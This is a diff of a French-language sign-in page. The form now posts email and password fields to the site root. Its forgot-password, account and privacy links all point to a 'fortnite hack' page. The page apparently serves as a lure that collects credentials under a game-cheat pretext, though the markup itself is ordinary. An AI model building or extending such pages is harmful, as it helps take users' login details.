@@ -126,21 +126,21 @@
         
         <h1>Se connecter</h1>
         
-        <form>
+        <!-- Formulaire pour se connecter -->
+        <form action="/" method="post">
             <div class="form-group">
-                <label>Adresse e-mail</label>
-                <input type="email">
+                <label for="email">Adresse e-mail</label>
+                <input type="email" name="email" id="email" required>
             </div>
             
             <div class="form-group">
-                <label>Mot de passe</label>
-                <input type="password">
+                <label for="password">Mot de passe</label>
+                <input type="password" name="password" id="password" required>
             </div>
             
             <a href="https://pepperhot.github.io/fortnite/hack.html" class="forgot-password">Mot de passe oublié ?</a>
             
-            <button type="button" class="login-button" onclick="window.location.href='https://pepperhot.github.io/fortnite/hack.html';">Connexion</button>
-
+            <button type="submit" class="login-button">Connexion</button>
         </form>
         
         <div class="show-more">
@@ -148,7 +148,7 @@
         </div>
         
         <div class="footer-links">
-            <a href="https://pepperhot.github.io/fortnite/hack.html" s">Créer un compte</a><br>
+            <a href="https://pepperhot.github.io/fortnite/hack.html">Créer un compte</a><br>
             <a href="https://pepperhot.github.io/fortnite/hack.html">Politique de confidentialité</a>
         </div>
     </div>
